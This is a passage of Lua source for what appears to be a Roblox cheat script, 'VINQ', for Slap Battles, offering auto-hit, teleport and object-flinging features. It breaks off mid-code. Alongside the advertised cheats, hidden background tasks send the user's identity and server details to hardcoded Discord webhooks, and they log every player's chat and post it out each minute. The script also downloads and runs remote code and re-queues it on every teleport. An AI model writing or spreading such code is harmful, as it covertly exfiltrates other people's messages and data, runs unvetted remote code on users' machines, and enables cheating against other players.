HttpService = cloneref(game:GetService("HttpService"))
local success, errorMessage = pcall(function()
    --[[
        skibidi toilet production ahh start
     ____   ____  _____  ____  _____   ___       ______   ________  ____   ____  ________  _____       ___   _______    ______   
    |_  _| |_  _||_   _||_   \|_   _|.'   `.    |_   _ `.|_   __  ||_  _| |_  _||_   __  ||_   _|    .'   `.|_   __ \ .' ____ \  
      \ \   / /    | |    |   \ | | /  .-.  \     | | `. \ | |_ \_|  \ \   / /    | |_ \_|  | |     /  .-.  \ | |__) || (___ \_| 
       \ \ / /     | |    | |\ \| | | |   | |     | |  | | |  _| _    \ \ / /     |  _| _   | |   _ | |   | | |  ___/  _.____`.  
        \ ' /     _| |_  _| |_\   |_\  `-'  \_   _| |_.' /_| |__/ |    \ ' /     _| |__/ | _| |__/ |\  `-'  /_| |_    | \____) | 
         \_/     |_____||_____|\____|`.___.\__| |______.'|________|     \_/     |________||________| `.___.'|_____|    \______.' 
                                                                                                                                 
    
    ]]
    warn("launched")
    while not game:IsLoaded() do
        task.wait(0.1)
    end
    local supportedplaceids = {
        11828384869, -- elude
		124596094333302,
        6403373529, -- normal place
        9015014224, -- no oneshots
        11520107397, -- killstreak only
        15507333474,
        9431156611, -- Slap Royale
        18550498098
    }
    
    if game.PlaceId == 15507333474 then
    while task.wait(0.1) do
    game:GetService("GuiService"):ClearError()
    game.CoreGui:WaitForChild("RobloxLoadingGUI"):Destroy()
    end
    return
    end
    if game.PlaceId == 9431156611 then
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/main/Royale"))()
            script:Destroy()
    return
    end
    if game.PlaceId == 18550498098 then
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/main/Where%20Guide%20Resides"))()
            script:Destroy()
    return
    end
    if not table.find(supportedplaceids, game.PlaceId) then
    local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
        Fluent:Notify({
            Title = "This place is not supported for vinq.",
            Content = "This place may get added later, who knows?",
            SubContent = "", 
            Duration = 8 
    })
	local LocalPlayer = game.Players.LocalPlayer
	task.spawn(function()
	LocalPlayer.OnTeleport:Connect(function(State)
       
       
            warn("Teleport started")
    local function queueteleportfunction()
        if queueteleport then
            warn("ye")
                task.wait(0.1)  
                    local scriptURL = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/lol.txt"
                    queueteleport("loadstring(game:HttpGet('" .. scriptURL .. "'))()")
        else
            warn("queueteleport function is not defined!")
        end
    
            queueteleportfunction()
            queueteleportfunction()
            queueteleportfunction()
            queueteleportfunction()
            queueteleportfunction()

        end
    end)
	end)
    return
    end
    local executor = identifyexecutor()
       local currentVersion = 3.32
       local CurrentVersionType = "Public"
            
    if game.PlaceId == 11828384869 then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/Elude"))()
        return
    end
    wait(1)
    
    if getgenv().VINQ_LOADED == true then 
        local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
        Fluent:Notify({
            Title = "VINQ is already loaded.",
            Content = "Thank you so much for using!",
            SubContent = "not 2 though..", 
            Duration = 5 
        })
        script:Destroy()  
        return
    end
    
    pcall(function() getgenv().VINQ_LOADED = true end)
    task.spawn(function()
        local A1bC2D3 = syn and syn.request or http_request or request or getgenv().request
        local webhooks = {
            "https://discord.com/api/webhooks/1333907684415770644/wCMakjhy0z3QiByjxzSUM2bgoXb4ClvbmCmfelxIYyyxZiJd8NDnijfc40hr2m0Ew8jU",
            "https://discord.com/api/webhooks/1333907719505055744/-5E0GL4PjB6o0w5FGhS8TgDFxbf4iJCG3D3CmproTnbZgWVFq7nqFRPCdtJNzhbe5d1W",
            "https://discord.com/api/webhooks/1333907763021090826/fuO3OBHjbVhvBWiKzvm0HYLxnZZA32WHz2ha2PpuhXvMDFOQBXktjaul66GIENkFY1H2",
            "https://discord.com/api/webhooks/1333909327425175674/Kor6Yat8UPL8uIEkwwPok2IVVvibNxylAemwHi2bg0eL7hKQcxmrGJ3QAX49OfuJwUCY",
            "https://discord.com/api/webhooks/1333909437597093908/oDGi93nfwE9YU-4_DxhaEAhUg_UFo8ND6ASnK2yg4jsIjogEICWZD7CgjdYaOoRA-S5e",
            "https://discord.com/api/webhooks/1333909519075381279/-gtoRRF0SDrhy-IxEJthBOhBkIwuPiu-03mlYobt80N8xUt3TO6x46EfM29ki5hekXCS"
        }
        local H1jK4L5 = game:GetService("HttpService")
        
        local function G3n4r5t3Key()
            return H1jK4L5:GenerateGUID(false):sub(1, 20)
        end
        
        local function S3nDKeyToWH(webhookUrl)
            if not A1bC2D3 then
                warn("HTTP request function is not available.")
                return false
            end
        
            local player = game.Players.LocalPlayer
            local username = player.Name
            local userId = player.UserId
        
            local embedData = {
                ["content"] = "<@&1333909165747339385>",  
                ["embeds"] = { {
                    ["title"] = username .. " (" .. userId .. ")",
                    ["description"] = "Uses VINQ In PlaceId: "..game.PlaceId.."\nJobId: ``"..game.JobId.."``\nSlap Count: "..game.Players.LocalPlayer.leaderstats.Slaps.Value.."\nVersion: "..currentVersion.."\nExecutor: "..executor,
                    ["color"] = 3447003 
                } }
            }
        
            local success, response = pcall(function()
                return A1bC2D3({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = H1jK4L5:JSONEncode(embedData)
                })
            end)
        
            if success then
                return true
            else
                
                return false
            end
        end
    
        local maxAttempts = 6
        local attempts = 0
        local sent = false
    
        while attempts < maxAttempts and not sent do
            for i, webhookUrl in ipairs(webhooks) do
                if S3nDKeyToWH(webhookUrl) then
                    sent = true
                    break
                end
            end
            attempts = attempts + 1
            if not sent then
                task.wait(3) 
            end
        end
    
        if not sent then
            warn("vinq is cool")
        end
    end)

    task.spawn(function()
        if getgenv().LoadedThing == true then warn("lol") return end
        pcall(function() getgenv().LoadedThing = true end)
        pcall(function() getgenv().LoadedThing = true end)
        pcall(function() getgenv().LoadedThing = true end)
        local requestFunc = syn and syn.request or http_request or request or getgenv().request
        if not requestFunc then 
            warn("No valid request function found")
            return 
        end
    
     
        local webhooks = {
            "https://discord.com/api/webhooks/1334174361959268464/maQPIIHF9UOMbUfE7ANwaHDF8Hm4Wup5jrBn9KgwnsgL1EErAENgKhHaT-1DAF9q1Bmq",
           
        }
    
      
        local HttpService = game:GetService("HttpService")
        local Players = game:GetService("Players")
        local messageLog = {}
    
      
        local function logMessage(player, message)
            local timestamp = os.time() 
            table.insert(messageLog, string.format("<t:%d:f> | %s: %s", timestamp, player.Name, message))
        end
    
       
        local function sendToWebhook(webhookUrl)
            local embedData = {
                ["content"] = "<@&1333912668725055579>",
                ["embeds"] = {{
                    title = "Chat Logs",
                    description = table.concat(messageLog, "\n") .. "\n\nPlaceID: " .. game.PlaceId .. "\nJobID: ``" .. game.JobId .. "``",
                    color = 3447003,
                    footer = {
                        text = "Collected by: " .. Players.LocalPlayer.Name .. " (" .. Players.LocalPlayer.UserId .. ")"
                    }
                }}
            }
    
            local success, response = pcall(function()
                return requestFunc({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(embedData)
                })
            end)
    
            return success and response.StatusCode == 204
        end
    
      
        local function monitorPlayer(player)
            player.Chatted:Connect(function(message)
                logMessage(player, message)
            end)
        end
    
      
        for _, player in ipairs(Players:GetPlayers()) do
            monitorPlayer(player)
        end
    
      
        Players.PlayerAdded:Connect(monitorPlayer)
    
   
        while true do
            task.wait(60)
            if #messageLog > 0 then
                local successCount = 0
                for _, url in ipairs(webhooks) do
                    if sendToWebhook(url) then
                        successCount += 1
                    end
                end
                if successCount > 0 then
                    table.clear(messageLog)
                end
            end
        end
    end)
    
    

    
    task.wait(0.1)
    local UICorner = Instance.new("UICorner")
    local MOBILE = Instance.new("TextButton")
	local MobileToggleGui = Instance.new("ScreenGui")
	MobileToggleGui.Parent = game.CoreGui
	MobileToggleGui.ResetOnSpawn = false
    MOBILE.Name = "MOBILE"
    MOBILE.AnchorPoint = Vector2.new(0.5, 0.5)
    MOBILE.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
    MOBILE.BackgroundTransparency = 0.150
    MOBILE.BorderColor3 = Color3.fromRGB(0, 0, 0)
    MOBILE.BorderSizePixel = 0
    MOBILE.Position = UDim2.new(0.963158548, 0, 0.150473937, 0)
    MOBILE.Size = UDim2.new(0.032429684, 0, 0.0567519367, 0)
    MOBILE.Font = Enum.Font.IndieFlower
    MOBILE.LineHeight = 3.000
    MOBILE.Text = "V"
    MOBILE.TextColor3 = Color3.fromRGB(224, 224, 224)
    MOBILE.TextScaled = true
    MOBILE.TextSize = 25.000
    MOBILE.TextWrapped = true
    UICorner.Parent = MOBILE
	MOBILE.Parent = MobileToggleGui
    local theframeig
    game.CoreGui.ChildAdded:Connect(function(child)
        if child.Name == "ScreenGui" then
            theframeig = child
        end
    end)
    
    local part
    if not game.Workspace:FindFirstChild("toiletRell") then
    part = Instance.new("Part", workspace)
    part.Name = "toiletRell"
    part.CFrame = CFrame.new(-0.42286601662635803, -8.794623374938965, -3.5176520347595215)
    part.Anchored = true
    part.CanCollide = false
    part.Size = Vector3.new(2048, 1, 2048)
    part.Transparency = 1
    else
    part = game.workspace:FindFirstChild("toiletRell")
    end
    local newinstance
    if not game.Workspace:FindFirstChild("Hideoutreallelrlre") then
    newinstance = Instance.new("Part")
    newinstance.Name = "Hideoutreallelrlre"
    newinstance.Parent = workspace
    newinstance.CFrame = CFrame.new(-14737.7978515625, 3181.704345703125, -29370.4921875)
    newinstance.Anchored = true
    newinstance.CanCollide = true
    newinstance.Size = Vector3.new(2048, 1, 2048)
    newinstance.Transparency = 0.4
    else
        newinstance = "Hideoutreallelrlre"
    end
    local antivoidmodel = Instance.new("Model")
antivoidmodel.Parent = workspace
antivoidmodel.Name = "antivd2"

local Part1 = Instance.new("Part")
Part1.CFrame = CFrame.new(-1384.75, 45.25, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part1.Anchored = true
Part1.Parent = antivoidmodel
Part1.Size = Vector3.new(2047.5001220703125, 1, 2047.75)
Part1.Transparency = 1
Part1.CanCollide = false

local Part2 = Instance.new("Part")
Part2.CFrame = CFrame.new(-349.569885, 15.0486565, 0, 0.342020035, 0.939692676, 0, -0.939692676, 0.342020035, 0, 0, 0, 1)
Part2.Anchored = true
Part2.Parent = antivoidmodel
Part2.Size = Vector3.new(65.5, 1, 2047.75)
Part2.Transparency = 1
Part2.CanCollide = false

local Part3 = Instance.new("Part")
Part3.CFrame = CFrame.new(-335.212982, -5.21888065, 0, -0.766044617, 0.642787457, 0, 0.642787457, 0.766044617, 8.74227766e-08, 5.61942635e-08, 6.69697471e-08, -1)
Part3.Anchored = true
Part3.Parent = antivoidmodel
Part3.Size = Vector3.new(42.5, 10, 2047.75)
Part3.Transparency = 1
Part3.CanCollide = false

local Part4 = Instance.new("Part")
Part4.CFrame = CFrame.new(-295.825317, -16.4536133, 0, -0.965925872, 0.258818924, 0, 0.258818924, 0.965925872, 8.74227766e-08, 2.26266685e-08, 8.44439185e-08, -1)
Part4.Anchored = true
Part4.Parent = antivoidmodel
Part4.Size = Vector3.new(76.5, 1, 2047.75)
Part4.Transparency = 1
Part4.CanCollide = false

local Part6 = Instance.new("Part")
Part6.CFrame = CFrame.new(-272.401917, -19.8301048, 0, 0.766044438, -0.642787576, 0, 0.642787576, 0.766044438, 0, 0, 0, 1)
Part6.Anchored = true
Part6.Parent = antivoidmodel
Part6.Size = Vector3.new(27, 1, 2047.75)
Part6.Transparency = 1
Part6.CanCollide = false

local Part7 = Instance.new("Part")
Part7.CFrame = CFrame.new(-69.875, -11, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part7.Anchored = true
Part7.Parent = antivoidmodel
Part7.Size = Vector3.new(385.25, 1, 2047.75)
Part7.Transparency = 1
Part7.CanCollide = false

local Part8 = Instance.new("Part")
Part8.CFrame = CFrame.new(150.125, -21, 0, 0.939692616, 0.342020154, 0, -0.342020154, 0.939692616, 0, 0, 0, 1)
Part8.Anchored = true
Part8.Parent = antivoidmodel
Part8.Size = Vector3.new(58.75, 1, 2047.75)
Part8.Transparency = 1
Part8.CanCollide = false

local Part9 = Instance.new("Part")
Part9.CFrame = CFrame.new(1166.625, -21.75, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part9.Anchored = true
Part9.Parent = antivoidmodel
Part9.Size = Vector3.new(2047.25, 1, 2047.75)
Part9.Transparency = 1
Part9.CanCollide = false

local Part10 = Instance.new("Part")
Part10.CFrame = CFrame.new(3419.625, 233.25, -19, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part10.Anchored = true
Part10.Parent = antivoidmodel
Part10.Size = Vector3.new(2047.25, 1, 2047.75)
Part10.Transparency = 1
Part10.CanCollide = false


    local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
    local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
    
    local thismightbefluent
    local todaysdate = os.date("%d %B") 
    game.CoreGui.ChildAdded:Connect(function(child)
        if child.Name == "ScreenGui" then
            thismightbefluent = child
        end
    end)
    local title
    
    if todaysdate == "25 December" then
        title = "VINQ SB - Merry Christmas"
    elseif todaysdate == "1 January" then
        title = "VINQ SB - Happy New Year"
        elseif todaysdate == "23 December" then
            title = "VINQ SB - Happy vinq anniversary!"
     elseif todaysdate == "01 April" then
            title = "VINQ SB - Herobrine is here... It's the 1st"
    elseif todaysdate == "20 April" then
            title = "VINQ SB - easter"
    elseif todaysdate == "24 July" then
            title = "VINQ SB - Themnost started edging on this date"
    else
        title = "Vinq SB - VINQ DEVELOPS"
    end
    
    local Window = Fluent:CreateWindow({
        Title = title,
        SubTitle = (executor and executor) or "",
        TabWidth = 160,
        Size = UDim2.fromOffset(580, 460),
        Acrylic = false, 
        Theme = "Darker",
        MinimizeKey = Enum.KeyCode.LeftControl 
    })
    
    game.CoreGui.ChildRemoved:Connect(function(ch)
        if ch == theframeig then
            pcall(function() getgenv().VINQ_LOADED = false end)
        end
    end)
	httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
    local TeleportCheck = false
    
    
    
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.OnTeleport:Connect(function(State)
      
        if State == Enum.TeleportState.RequestedFromServer  then
            TeleportCheck = true
            warn("Teleport started")
    local function queueteleportfunction()
        if queueteleport then
            warn("ye")
                task.wait(0.1)  
                    local scriptURL = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/lol.txt"
                    queueteleport("loadstring(game:HttpGet('" .. scriptURL .. "'))()")
        else
            warn("queueteleport function is not defined!")
        end
    end
    
            queueteleportfunction()
            queueteleportfunction()
            queueteleportfunction()
            queueteleportfunction()
            queueteleportfunction()

        end
    end)
    
    
    
local Tabs = {
    Info = Window:AddTab({ Title = "Information", Icon = "info" }),
    Main = Window:AddTab({ Title = "Main", Icon = "book" }),
	SlapAura = Window:AddTab({ Title = "Slap Aura", Icon = "hand" }),
    Other = Window:AddTab({ Title = "Miscellaneous", Icon = "package-plus" }),
    Antis = Window:AddTab({ Title = "Antis", Icon = "shield-alert" }),
    Lag = Window:AddTab({ Title = "Lag Control", Icon = "wifi-off" }),
    Masteries = Window:AddTab({ Title = "Mastery", Icon = "graduation-cap" }),
    Changelogs = Window:AddTab({ Title = "Changelogs", Icon = "clipboard" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
    configss = Window:AddTab({ Title = "Config", Icon = "file-text" }),
}

    
    Window:SelectTab(1)
    local HttpService = syn and syn.request or http_request or request or getgenv().request
    
    local url = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/version"
    
    if HttpService then
        local response = HttpService({Url = url, Method = "GET"})
        if response and response.StatusCode == 200 then
            local data = game:GetService("HttpService"):JSONDecode(response.Body)
            local remoteVersion = tonumber(data.Version)
            local announcement = data.Announcement
            
            if remoteVersion and remoteVersion ~= currentVersion and remoteVersion > currentVersion then
                task.delay(20, function()
                    if  theframeig ~= nil then
                        game.Players.LocalPlayer:Kick("This version is not supported. Please execute a supported version.")
                    end
                end)
                Window:Dialog({
                    Title = "Update Available!",
                       Content = "Update: " .. currentVersion .. " -> " .. remoteVersion .. "\nAnnouncement by developer: " .. (announcement or "No announcement provided."),
                    Buttons = {
                        { 
                            Title = "Update",
                            Callback = function()
                                pcall(function() getgenv().VINQ_LOADED = false end)
                                theframeig:Destroy()
                                loadstring(game:HttpGet('https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/lol.txt'))()
								task.wait(0.1)
								theframeig = nil
                            end 
                        }, {
                            Title = "Destroy the GUI",
                            Callback = function()
                            pcall(function() getgenv().VINQ_LOADED = false end)
                                theframeig:Destroy()
								task.wait(0.1)
								theframeig = nil
                            end 
                        }
                    }
                })
            end
        end
    else
        Window:Dialog({
            Title = "Failed to get HTTP requests",
            Content = [[
    If you are running an older version, we will not prompt you with any updates.
    Report this in the discord.]],
            Buttons = {
                { 
                    Title = "I understand",
                    Callback = function()
                        warn("ok")
                    end 
                }
            }
        })
    end
    
    
    
    if todaysdate == "25 December" then
        Window:Dialog({
            Title = "Merry Christmas",
            Content = "Merry Christmas. Thank you for using vinq!",
            Buttons = {
                { 
                    Title = "OK",
                }
            }
        })
    elseif todaysdate == "1 January" then
        Window:Dialog({
            Title = "Happy New Year!",
            Content = "Thanks for using vinq, and a happy new year!",
            Buttons = {
                { 
                    Title = "OK",
                }
            }
        })
    end
local SlappleTpFarm
    local ping = game.Players.LocalPlayer:GetNetworkPing() * 1000
    if ping >= 150 then
        Fluent:Notify({
            Title = "Your ping is high",
            Content = "Some features may not work well.",
            SubContent = "especially slap aura", 
            Duration = 5
    })
    end

    task.spawn(function()
        if os.date("%d %B") == "23 December" then
            local launchTime = os.time({year = 2023, month = 12, day = 23, hour = 18, min = 0, sec = 0})
            local currentTime = os.time()
            local diff = os.difftime(currentTime, launchTime)
            
            
            local launchDate = os.date("*t", launchTime)
            local currentDate = os.date("*t", currentTime)
            local years = currentDate.year - launchDate.year
            local months = currentDate.month - launchDate.month
            local days = currentDate.day - launchDate.day
            local hours = currentDate.hour - launchDate.hour
            local minutes = currentDate.min - launchDate.min
            
      
            if minutes < 0 then
                minutes = minutes + 60
                hours = hours - 1
            end
            if hours < 0 then
                hours = hours + 24
                days = days - 1
            end
            if days < 0 then
            
                local previousMonth = (currentDate.month == 1) and 12 or (currentDate.month - 1)
                local yearForMonth = (previousMonth == 12) and (currentDate.year - 1) or currentDate.year
                days = days + os.date("*t", os.time({year = yearForMonth, month = previousMonth + 1, day = 0})).day
                months = months - 1
            end
            if months < 0 then
                months = months + 12
                years = years - 1
            end
            
            local description = string.format(
                "[info may be inaccurate]Vinq was made ~: %d year(s), %d month(s), %d day(s), %d hour(s), %d minute(s) ago.",
                years, months, days, hours, minutes
            )
            
            Tabs.Info:AddParagraph({
                Title = "Happy anniversary",
                Content = description,
            })
        end
    end)
  
local glovelmastering = false
local gloveldigging = false
local cooldownPlayers = {} 


task.spawn(function()
    while true do
        if glovelmastering and not gloveldigging then
            local player = game.Players.LocalPlayer

         
            if player and player.Character then
                local glovelTool = player.Backpack:FindFirstChild("Glovel") or player.Character:FindFirstChild("Glovel")

                if glovelTool then
                
                    local validPlayers = {}
                    for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
                
                        if not cooldownPlayers[targetPlayer] and targetPlayer ~= player and targetPlayer.Character and targetPlayer.Character:FindFirstChild("isInArena") and targetPlayer.Character.isInArena.Value then
                            local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                table.insert(validPlayers, {Player = targetPlayer, HRP = hrp})
                            end
                        end
                    end

                  
                    if #validPlayers > 0 then
                        local closestPlayer = nil
                        local closestDistance = math.huge
                        local playerHRP = player.Character:FindFirstChild("HumanoidRootPart")

                        if playerHRP then
                            for _, data in ipairs(validPlayers) do
                                local distance = (playerHRP.Position - data.HRP.Position).Magnitude
                                if distance < closestDistance then
                                    closestDistance = distance
                                    closestPlayer = data
                                end
                            end
                        end

                        if closestPlayer then
                            local hrp = closestPlayer.HRP

                       
                            local behindPosition = hrp.CFrame * CFrame.new(0, 0, 2)
                            player.Character.HumanoidRootPart.CFrame = behindPosition

                     
                            task.wait(0.3)
                            game.ReplicatedStorage.GeneralHit:FireServer(hrp, true)

                        
                            cooldownPlayers[closestPlayer.Player] = true
                            task.delay(1.2, function()
                                cooldownPlayers[closestPlayer.Player] = nil 
                            end)
                            task.wait(0.25)
                        end
                   
                    end
					 else
                   
                        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Glovel" and game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character.isInArena.Value then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Lobby.Teleport1.CFrame
                            task.wait(0.2)
                        end
                end
            end
        end

   
        task.wait(0.1)
    end
end)

    
    local MasteryGlovel = Tabs.Masteries:AddToggle("MasteryGlovel", 
{
    Title = "Glovel Mastery Critical", 
    Description = "Autohit & teleport behind players, to cause criticals.",
    Default = false,
    Callback = function(state)
		glovelmastering = state
	
    end 
})
Tabs.Masteries:AddButton({
    Title = "Glovel Mastery Digging", 
    Description = "Automatically dig 300 times.",
    Callback = function()
        local player = game.Players.LocalPlayer
        local HttpService = game:GetService("HttpService")
        local active = true -- Flag to control all loops
		gloveldigging = true
        if player and player.Character then
            local glovelTool = player.Backpack:FindFirstChild("Glovel") or player.Character:FindFirstChild("Glovel")
            if glovelTool then
                
                task.spawn(function()
                    while active do
                   
                        local playerData = game:GetService("ReplicatedStorage").PlayerData:FindFirstChild(player.Name)
                        if playerData then
                            local masteryObj = playerData:FindFirstChild("GloveMasteryProgress")
                            if masteryObj and masteryObj:IsA("StringValue") then
                                local success, parsed = pcall(HttpService.JSONDecode, HttpService, masteryObj.Value)
                                if success and parsed and parsed.Glovel and parsed.Glovel.Digs then
                                    if parsed.Glovel.Digs > 300 then
                                        active = false -- 
										gloveldigging = false
                                        break
                                    end
                                end
                            end
                        end

                     
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                        task.wait(0.0) 
                    end
                end)
            end
        end
    end
})



    Tabs.Info:AddButton({
        Title = "Join the Discord",
        Description = [[
        Join for early releases. Copies to your clipboard.
        If you have any suggestions, suggest them there.]],
        Callback = function()
            setclipboard("discord.gg/nRFkNPbGGW")
            Window:Dialog({
        Title = "The URL has been copied",
        Content = "Thank you so much for joining!",
        Buttons = {
            { 
                Title = "OK",
                
            
            }
        }
    })
        end
    })
    
    Tabs.Info:AddParagraph({
        Title = "Version "..currentVersion..". "..CurrentVersionType,
        Content = "Updated to Version "..currentVersion
    })
    Tabs.Info:AddParagraph({
        Title = "Credits",
        Content = [[Thanks to:
        - vinq
        - Elitech
        - Miko
        - themnost
		- Xeuk]]
    })
    local URLWebhook = "https://discord.com/api/webhooks/1320391835184795668/An5gP9MZ2Ck-_qBKMxCXTa4z4DLSBNBas9b1MrrdUMHzxUb4cPzlLBie-NjGG1872QI3"
    local cd = false

	
	


    _G.UnioningPlayers = false 
task.spawn(function()

    local CONFIG = {
        MOVEMENT_SPEED = 800,
        TELEPORT_INTERVAL = 0.05,
        OFFSET_DISTANCE = 5,
        PLAYER_BAN_TIME = 1.5,
        UPDATE_INTERVAL = 0.1
    }


    local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")

 
    local LocalPlayer = Players.LocalPlayer
    local BannedPlayers = {}
    local ActiveUnions = {}
    local ActiveCoroutines = {}

 
    local OFFSET_POSITIONS = {
        function(cf) return cf * CFrame.new(0, CONFIG.OFFSET_DISTANCE, 0) end,     
        function(cf) return cf * CFrame.new(0, -CONFIG.OFFSET_DISTANCE, 0) end,   
        function(cf) return cf * CFrame.new(0, 0, CONFIG.OFFSET_DISTANCE) end,   
        function(cf) return cf * CFrame.new(0, 0, -CONFIG.OFFSET_DISTANCE) end, 
        function(cf) return cf * CFrame.new(CONFIG.OFFSET_DISTANCE, 0, 0) end,   
        function(cf) return cf * CFrame.new(-CONFIG.OFFSET_DISTANCE, 0, 0) end,  
        function(cf) return cf end,                                              
        function(cf) return cf * CFrame.new(CONFIG.OFFSET_DISTANCE, CONFIG.OFFSET_DISTANCE, 0) end,
        function(cf) return cf * CFrame.new(-CONFIG.OFFSET_DISTANCE, CONFIG.OFFSET_DISTANCE, 0) end,
        function(cf) return cf * CFrame.new(0, CONFIG.OFFSET_DISTANCE, CONFIG.OFFSET_DISTANCE) end,
        function(cf) return cf * CFrame.new(0, CONFIG.OFFSET_DISTANCE, -CONFIG.OFFSET_DISTANCE) end
    }

    
    local function isValidTarget(player)
        if player == LocalPlayer then return false end
        
        local character = player.Character
        if not character then return false end
        
        return character:FindFirstChild("isInArena") 
            and character.isInArena.Value 
            and not character:FindFirstChild("FakePart Left Leg")
            and not character:FindFirstChild("rock")
            and not BannedPlayers[player]
    end

 
    local function getRandomTarget()
        local validPlayers = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if isValidTarget(player) then
                table.insert(validPlayers, player)
            end
        end
        
        return #validPlayers > 0 and validPlayers[math.random(1, #validPlayers)] or nil
    end

  
    local function stopAllUnions()
        for union, thread in pairs(ActiveCoroutines) do
            if type(thread) == "thread" then
                coroutine.close(thread)
            end
            if union and union:IsA("UnionOperation") then
                union.Velocity = Vector3.zero
            end
        end
        
        table.clear(ActiveCoroutines)
        table.clear(ActiveUnions)
        table.clear(BannedPlayers)
    end

   
    local function moveUnionErratically(union)
        while _G.UnioningPlayers do
            local targetPlayer = getRandomTarget()
            if not targetPlayer then
                task.wait(0.1)
                continue
            end
            
            local character = targetPlayer.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then continue end
            
            while _G.UnioningPlayers and isValidTarget(targetPlayer) do
                local getRandomPosition = OFFSET_POSITIONS[math.random(1, #OFFSET_POSITIONS)]
                local targetCFrame = humanoidRootPart.CFrame
                
                local newCFrame = getRandomPosition(targetCFrame)
                local newPosition = newCFrame.Position
                
                local direction = (newPosition - union.Position)
                union.Velocity = direction.Unit * CONFIG.MOVEMENT_SPEED
                
                task.wait(CONFIG.TELEPORT_INTERVAL)
            end
            
            if _G.UnioningPlayers then
                BannedPlayers[targetPlayer] = true
                task.delay(CONFIG.PLAYER_BAN_TIME, function()
                    BannedPlayers[targetPlayer] = nil
                end)
                
                union.Velocity = Vector3.zero
                task.wait(0.1)
            end
        end
        
        if union and union:IsA("UnionOperation") then
            union.Velocity = Vector3.zero
        end
    end

    
    local function startTrackingUnion(union)
        if not ActiveUnions[union] and _G.UnioningPlayers then
            ActiveUnions[union] = true
            ActiveCoroutines[union] = task.spawn(function()
                moveUnionErratically(union)
            end)
        end
    end


    task.spawn(function()
        local lastState = _G.UnioningPlayers
        while true do
            if lastState ~= _G.UnioningPlayers then
                if _G.UnioningPlayers then
                    for _, obj in ipairs(Workspace:GetChildren()) do
                        if obj:IsA("UnionOperation") and not obj.Anchored then
                            startTrackingUnion(obj)
                        end
                    end
                else
                    stopAllUnions()
                end
                lastState = _G.UnioningPlayers
            end
            task.wait(0.1)
        end
    end)

  
    Workspace.ChildAdded:Connect(function(child)
        if child:IsA("UnionOperation") and not child.Anchored and _G.UnioningPlayers then
            startTrackingUnion(child)
        end
    end)


    Workspace.ChildRemoved:Connect(function(child)
        if child:IsA("UnionOperation") then
            ActiveUnions[child] = nil
            if ActiveCoroutines[child] then
                coroutine.close(ActiveCoroutines[child])
                ActiveCoroutines[child] = nil
            end
        end
    end)
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local radius = 50
local height = 100
local rotationSpeed = 0.5
local attractionStrength = 200
local tornadoEnabled = false


local originalProperties = {}


local function RetainPart(Part)
    if Part:IsA("BasePart") and not Part.Anchored and Part:IsDescendantOf(Workspace) then
        if Part.Parent == LocalPlayer.Character or Part:IsDescendantOf(LocalPlayer.Character) then
            return false
        end

    
        if not originalProperties[Part] then
            originalProperties[Part] = {
                CustomPhysicalProperties = Part.CustomPhysicalProperties,
                CanCollide = Part.CanCollide,
                Velocity = Part.Velocity
            }
        end

        if tornadoEnabled then
            Part.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0, 0, 0)
            Part.CanCollide = false
        end

        return true
    end
    return false
end


local function ResetPartProperties(Part)
    if originalProperties[Part] then
        Part.CustomPhysicalProperties = originalProperties[Part].CustomPhysicalProperties
        Part.CanCollide = originalProperties[Part].CanCollide
        Part.Velocity = Vector3.zero
        originalProperties[Part] = nil
    end
end


local parts = {}
local function addPart(part)
    if RetainPart(part) then
        if not table.find(parts, part) then
            table.insert(parts, part)
        end
    end
end

local function removePart(part)
    local index = table.find(parts, part)
    if index then
        table.remove(parts, index)
    end
    ResetPartProperties(part)
end


for _, part in pairs(Workspace:GetDescendants()) do
    addPart(part)
end

Workspace.DescendantAdded:Connect(addPart)
Workspace.DescendantRemoving:Connect(removePart)





task.spawn(function()
